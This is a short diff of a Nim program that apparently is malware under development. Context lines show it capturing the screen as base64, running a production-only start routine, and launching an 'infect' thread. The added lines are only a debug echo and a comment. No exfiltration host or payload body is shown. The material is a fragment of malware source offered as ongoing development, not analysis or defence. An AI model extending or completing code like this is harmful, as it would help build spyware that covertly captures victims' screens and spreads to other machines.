@@ -16,6 +16,9 @@ when isProd:
   from lib/functions/beforeStart import run
   run()
 
+when not isProd:
+  echo "started"
+
 let base64Ss: string = screenshot()
 
 # writeFile("base64.tmp.txt", base64Ss)
@@ -45,6 +48,7 @@ when USE_INFECT_THREAD:
 
   createThread(infectThreadVar, initInfectThread)
 
+# wait for thread messages
 while true:
   ## TODO:
   ## NEVOIE DE OPTIMIZARI
